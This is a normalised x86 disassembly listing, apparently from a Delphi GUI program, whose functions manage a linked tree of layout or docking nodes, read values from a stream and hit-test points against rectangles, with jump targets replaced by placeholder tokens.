mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44f6bc
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_44f6bc
mov ecx ebx
pop edx
call sub_41a040
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_446944
mov eax [ ebp - 0x4 ]
call sub_44faf0
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_44faf0
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_44faf0
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_44faf0
push ebx
mov ebx eax
mov eax ebx
call sub_44f5f8
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_44f580
test al al
je r-xdata
mov eax ebx
call sub_44f62c
pop ebx
retn
sub_44fb2c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44fb18
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44f5c8
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_44fb1c
mov edx esi
call sub_44fb2c
sub_44fb68
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44faf0
mov edi eax
mov eax ebx
call sub_44f62c
cmp edi eax
jl r-xdata
mov eax esi
call sub_44f7d8
mov eax [ esi + 0x1c ]
push eax
push sub_451678
mov edx esi
call sub_44fea4
mov eax ebx
call sub_44faf0
mov edi eax
mov eax esi
call sub_44f674
cmp edi eax
jle r-xdata
mov eax ebx
call sub_44fb68
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_44fbd4
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_44f5f8
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_44fbfc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403360
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_4036f4
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44f5a4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427460
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_42e1b8
mov edx eax
mov eax ebx
call sub_4275dc
mov eax [ ebp - 0x4 ]
call sub_44fdcc
xor eax eax
push ebp
push sub_44fd08
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_44a49c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_44f7d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fd0f
mov eax [ ebp - 0x4 ]
call sub_44fdd0
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_44a460
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_44fd0f
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_451ba0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_44fd64
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_450dd0
mov eax [ esi + 0x10 ]
call sub_403390
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_44fde4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_44fde4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_44fde4
pop ecx
sub_44fe3c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_44fde4
pop ecx
sub_44fe68
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44fe68
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44fe68
pop ecx
sub_44febc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_44fe3c
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_44f728
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_44f728
push eax
mov edx 0x1
mov eax ebx
call sub_44f6bc
push eax
mov edx 0x2
mov eax ebx
call sub_44f6bc
pop edx
pop ecx
call sub_41a040
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402da4
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44ff40
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_44f978
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_41a040
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_446944
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44f5a4
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_44fe3c
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_44f5c8
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_450e68
mov edx esi
mov eax ebx
call sub_44fe3c
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_446f28
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44f5a4
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_446f14
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_44f728
mov edx eax
mov eax edi
call sub_44fb18
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_44f728
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_44f728
mov edx eax
mov eax edi
call sub_44fb18
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_44f728
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_450150
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_4502f8
jmp r-xdata
sub_450150
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44f5a4
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_44faf0
mov edx eax
mov eax ebx
call sub_44fb18
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_44fb18
mov eax [ esi + 0x64 ]
call sub_44faf0
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_4511c0
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_44fea4
mov eax [ esi + 0x64 ]
call sub_44faf0
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_4511c0
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_44fea4
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_451544
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_44fea4
mov eax [ esi + 0x64 ]
call sub_44faf0
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_451678
xor edx edx
mov eax esi
call sub_44fea4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_44fb18
adc edx 0x0
mov eax ebx
call sub_44f7d8
mov eax ebx
call sub_44fb68
push esi
push sub_451678
xor edx edx
mov eax esi
call sub_44fea4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_4502f8
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_44f7d8
mov eax [ ebx + 0x14 ]
call sub_44fb68
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_450370
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_44faf0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_44faf0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_44faf0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_44f6bc
mov esi eax
mov edx 0x2
mov eax ebx
call sub_44f6bc
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_44faf0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_44fbc8
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_44fbf0
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44fbc8
call sub_450370
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44fbf0
call sub_450370
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_44f728
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_44f728
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_45059c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_44a49c
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_44a460
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_419ff0
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450630
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_45059c
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_44fbf0
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_44fe3c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_44fbf0
call sub_450370
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_4506b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_404120
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_40476c
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_450700
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4508f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_450dd0
mov eax [ ebp - 0x8 ]
call sub_44fdcc
xor edx edx
push ebp
push sub_4508db
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4508e2
mov eax [ ebp - 0x8 ]
call sub_44fdd0
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44f5a4
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_4506b8
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_40358c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_44f8c4
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_4506b8
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_446ea4
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_447c84
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403390
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
